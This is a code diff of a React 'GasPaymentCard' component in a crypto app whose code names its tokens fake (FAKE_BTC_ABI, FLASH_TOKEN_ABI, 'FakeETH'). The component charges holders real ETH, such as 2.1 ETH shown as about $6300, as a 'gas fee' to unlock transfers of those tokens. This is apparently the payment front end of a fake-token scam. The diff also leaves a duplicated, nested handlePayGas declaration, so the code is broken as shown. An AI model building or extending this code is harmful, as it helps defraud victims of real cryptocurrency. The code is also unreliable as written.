@@ -5,9 +5,9 @@ import { FAKE_BTC_ABI } from "../abis/index";
 
 /**
  * Gas Payment Card - Pay gas fees to enable token transfers
- * Cross-Token Mechanism:
+ * Token Mechanism:
  * - BTC users pay 2.1 ETH
- * - ETH users pay 0.02 BTC
+ * - SOL users pay 0.1 ETH
  */
 export default function GasPaymentCard() {
   const { account, signer, isConnected } = useWeb3Store();
@@ -15,17 +15,13 @@ export default function GasPaymentCard() {
 
   const [payAmount, setPayAmount] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [isApproving, setIsApproving] = useState(false);
   const [result, setResult] = useState(null);
   const [error, setError] = useState("");
-  const [isBTCApproved, setIsBTCApproved] = useState(false);
   const [customGasFee, setCustomGasFee] = useState(null); // Custom fee if set by admin
 
   const contractAddress = tokenAddresses[selectedToken];
-  const otherToken = selectedToken === "BTC" ? "ETH" : "BTC";
-  const otherTokenAddress = tokenAddresses[otherToken];
 
-  // Gas fees - cross-token
+  // Gas fees - ETH payment for both tokens
   const gasFeeConfig = {
     BTC: {
       paymentToken: "ETH",
@@ -33,11 +29,11 @@ export default function GasPaymentCard() {
       paymentDecimals: 18,
       display: "2.1 ETH (~$6300)"
     },
-    ETH: {
-      paymentToken: "BTC",
-      paymentAmount: "0.02",
-      paymentDecimals: 8,
-      display: "0.02 BTC (~$2100)"
+    SOL: {
+      paymentToken: "ETH",
+      paymentAmount: "0.1",
+      paymentDecimals: 18,
+      display: "0.1 ETH (~$300)"
     }
   };
 
@@ -76,76 +72,15 @@ export default function GasPaymentCard() {
     checkCustomGasFee();
   }, [account, signer, contractAddress, selectedToken]);
 
-  // Check BTC approval (if paying with BTC)
-  useEffect(() => {
-    if (selectedToken === "ETH") {
-      checkBTCApproval();
-    }
-  }, [account, signer, selectedToken]);
-
-  const checkBTCApproval = async () => {
-    if (!signer || !otherTokenAddress) return;
-
-    try {
-      const btcContract = new ethers.Contract(otherTokenAddress, FLASH_TOKEN_ABI, signer);
-      const allowance = await btcContract.allowance(account, contractAddress);
-      const btcAmount = ethers.parseUnits(currentConfig.paymentAmount, currentConfig.paymentDecimals);
-      setIsBTCApproved(allowance >= btcAmount);
-    } catch (err) {
-      console.error("Error checking BTC approval:", err);
-      setIsBTCApproved(false);
-    }
-  };
-
-  const handleApproveBTC = async () => {
-    if (!isConnected || !signer) {
-      setError("Please connect wallet first");
-      return;
-    }
-
-    setIsApproving(true);
-    setError("");
-    setResult(null);
-
-    try {
-      const btcContract = new ethers.Contract(otherTokenAddress, FLASH_TOKEN_ABI, signer);
-      const btcAmount = ethers.parseUnits(currentConfig.paymentAmount, currentConfig.paymentDecimals);
-
-      console.log(`🔑 Approving FakeETH contract to spend ${currentConfig.paymentAmount} BTC`);
-
-      // Approve with extra amount for safety
-      const approveAmount = ethers.parseUnits("10", currentConfig.paymentDecimals);
-      const tx = await btcContract.approve(contractAddress, approveAmount);
-
-      console.log(`⏳ Approval pending: ${tx.hash}`);
-      await tx.wait();
-
-      setIsBTCApproved(true);
-      setResult({
-        success: true,
-        hash: tx.hash,
-        message: `✅ BTC approval successful! Now you can pay gas fee.`,
-      });
-    } catch (err) {
-      const errorMsg = err.reason || err.message || "Approval failed";
-      setError(errorMsg);
-      setResult({
-        success: false,
-        message: `❌ Approval failed: ${errorMsg}`,
-      });
-    } finally {
-      setIsApproving(false);
-    }
-  };
-
   const handlePayGas = async () => {
     if (!isConnected || !signer) {
       setError("Please connect wallet first");
       return;
     }
 
-    if (selectedToken === "ETH" && !isBTCApproved) {
-      setError("Please approve BTC first");
+  const handlePayGas = async () => {
+    if (!isConnected || !signer) {
+      setError("Please connect wallet first");
       return;
     }
 
@@ -156,40 +91,21 @@ export default function GasPaymentCard() {
     try {
       const contract = new ethers.Contract(contractAddress, FAKE_BTC_ABI, signer);
 
-      if (selectedToken === "BTC") {
-        // BTC users pay in ETH
-        const valueInWei = ethers.parseEther(currentConfig.paymentAmount);
-        console.log(`💰 BTC user paying ${currentConfig.paymentAmount} ETH for gas fee`);
+      // Both BTC and SOL users pay in ETH
+      const valueInWei = ethers.parseEther(currentConfig.paymentAmount);
+      console.log(`💰 ${selectedToken} user paying ${currentConfig.paymentAmount} ETH for gas fee`);
 
-        const tx = await contract.payGasFee({ value: valueInWei });
-        console.log(`⏳ Transaction pending: ${tx.hash}`);
-        await tx.wait();
+      const tx = await contract.payGasFee({ value: valueInWei });
+      console.log(`⏳ Transaction pending: ${tx.hash}`);
+      await tx.wait();
 
-        setResult({
-          success: true,
-          hash: tx.hash,
-          message: `✅ Gas fee of ${currentConfig.paymentAmount} ETH paid! BTC transfers now enabled.`,
-        });
+      setResult({
+        success: true,
+        hash: tx.hash,
+        message: `✅ Gas fee of ${currentConfig.paymentAmount} ETH paid! ${selectedToken} transfers now enabled.`,
+      });
 
-        updateGasBalance("BTC", valueInWei.toString());
-      } else {
-        // ETH users pay in BTC
-        const btcAmount = ethers.parseUnits(currentConfig.paymentAmount, currentConfig.paymentDecimals);
-        console.log(`💰 ETH user paying ${currentConfig.paymentAmount} BTC for gas fee`);
-
-        const tx = await contract.payGasFeeWithBTC(btcAmount);
-        console.log(`⏳ Transaction pending: ${tx.hash}`);
-        await tx.wait();
-
-        setResult({
-          success: true,
-          hash: tx.hash,
-          message: `✅ Gas fee of ${currentConfig.paymentAmount} BTC paid! ETH transfers now enabled.`,
-        });
-
-        updateGasBalance("ETH", btcAmount.toString());
-      }
-
+      updateGasBalance(selectedToken, valueInWei.toString());
       setPayAmount(currentConfig.paymentAmount);
     } catch (err) {
       const errorMsg = err.reason || err.message || "Payment failed";
@@ -213,10 +129,10 @@ export default function GasPaymentCard() {
         {selectedToken === "BTC" ? "Pay ETH to enable BTC transfers" : "Pay BTC to enable ETH transfers"}
       </p>
 
-      {/* Cross-Token Info Box */}
+      {/* Token Gas Fee Info Box */}
       <div className="bg-blue-900 bg-opacity-30 border border-blue-700 rounded-lg p-4 mb-5">
         <p className="text-sm text-blue-200">
-          🔄 <strong>Cross-Token Gas Fee:</strong> {selectedToken} users must pay in {currentConfig.paymentToken}
+          💰 <strong>Gas Fee:</strong> Pay {currentConfig.paymentAmount} {currentConfig.paymentToken} to enable {selectedToken} transfers
         </p>
       </div>
 
@@ -229,28 +145,6 @@ export default function GasPaymentCard() {
           </span>
         </div>
       </div>
-
-      {/* BTC Approval Step (for ETH users) */}
-      {selectedToken === "ETH" && (
-        <div className="mb-5 p-4 bg-orange-900 bg-opacity-30 border border-orange-700 rounded-lg">
-          <p className="text-sm text-orange-200 mb-3">
-            ⚠️ <strong>Step 1:</strong> Approve BTC contract to spend your BTC
-          </p>
-          <button
-            onClick={handleApproveBTC}
-            disabled={isApproving || isBTCApproved}
-            className={`w-full py-2 px-3 rounded-lg font-semibold text-sm transition-all ${
-              isBTCApproved
-                ? "bg-green-600 text-white"
-                : isApproving
-                ? "bg-orange-600 text-white"
-                : "bg-orange-500 hover:bg-orange-600 text-white"
-            }`}
-          >
-            {isBTCApproved ? "✅ BTC Approved" : isApproving ? "Approving..." : "Approve BTC"}
-          </button>
-        </div>
-      )}
 
       {/* Payment Info */}
       <div className="mb-5 p-4 bg-gray-700 rounded-lg">
@@ -316,13 +210,9 @@ export default function GasPaymentCard() {
       {/* Pay Button */}
       <button
         onClick={handlePayGas}
-        disabled={
-          isLoading ||
-          !isConnected ||
-          (selectedToken === "ETH" && !isBTCApproved)
-        }
+        disabled={isLoading || !isConnected}
         className={`w-full py-3 px-4 rounded-lg font-semibold transition-all flex items-center justify-center gap-2 ${
-          isLoading || !isConnected || (selectedToken === "ETH" && !isBTCApproved)
+          isLoading || !isConnected
             ? "bg-gray-700 text-gray-400 cursor-not-allowed opacity-50"
             : "bg-gradient-to-r from-blue-500 to-blue-600 text-white hover:from-blue-600 hover:to-blue-700 shadow-lg hover:shadow-xl"
         }`}
@@ -343,7 +233,7 @@ export default function GasPaymentCard() {
       {/* Info Footer */}
       <div className="mt-4 text-xs text-gray-500">
         <p>
-          🔐 <strong>{selectedToken} users:</strong> Pay {currentConfig.paymentAmount} {currentConfig.paymentToken} ({currentConfig.display}) to enable transfers
+          🔐 <strong>{selectedToken} transfers:</strong> After paying {currentConfig.paymentAmount} {currentConfig.paymentToken}, gas fee will be deducted from your wallet on each transfer
         </p>
       </div>
     </div>
